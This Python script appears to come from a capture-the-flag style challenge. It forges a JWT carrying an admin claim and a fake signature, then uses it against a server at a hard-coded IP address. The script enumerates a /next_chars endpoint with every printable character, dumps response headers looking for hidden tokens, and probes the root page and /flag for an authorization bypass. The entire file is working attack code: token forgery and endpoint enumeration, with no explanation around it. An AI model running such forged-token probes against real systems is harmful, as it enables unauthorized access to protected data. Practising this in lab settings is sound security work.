#!/usr/bin/env python3
import base64, json, time, string, requests

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {"alg": "HS256", "typ": "JWT"}
header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps({"admin": True, "timestamp": int(time.time())}, separators=(",", ":")).encode())
forged_jwt = f"{header_b64}.{payload_b64}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

SECRET = "77.76.10.37"

print("### Full response headers for /next_chars?char=s (look for hidden tokens) ###")
r = requests.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": forged_jwt}, timeout=5)
print("Headers:", dict(r.headers))
print("Body:", r.text)
print()

print("### Querying every printable char against /next_chars with admin JWT ###")
seen = {}
for c in string.printable:
    if c in "\n\r\t\x0b\x0c":
        continue
    try:
        r = requests.get(f"http://{SECRET}/next_chars", params={"char": c}, headers={"JWT": forged_jwt}, timeout=4)
        body = r.text.strip()
        if body not in ("[]", ""):
            seen[c] = body
    except requests.exceptions.RequestException as e:
        print(f"  char={c!r} ERROR: {e}")

print("Non-empty responses:")
for c, body in seen.items():
    print(f"  char={c!r} -> {body}")

print()
print("### /next_chars with NO char param, admin JWT (see if it reveals a start/full list) ###")
r = requests.get(f"http://{SECRET}/next_chars", headers={"JWT": forged_jwt}, timeout=5)
print(f"  -> {r.status_code}: {r.text.strip()[:500]}")

print()
print("### root / on secret-server with admin JWT (maybe unlocks a different page) ###")
r = requests.get(f"http://{SECRET}/", headers={"JWT": forged_jwt}, timeout=5)
print(f"  -> {r.status_code}, headers={dict(r.headers)}")
print(f"  body: {r.text.strip()[:500]}")

print()
print("### /flag on secret-server with admin JWT, dumping FULL headers (even though body is 403) ###")
r = requests.get(f"http://{SECRET}/flag", headers={"JWT": forged_jwt}, timeout=5)
print(f"  -> {r.status_code}, headers={dict(r.headers)}")
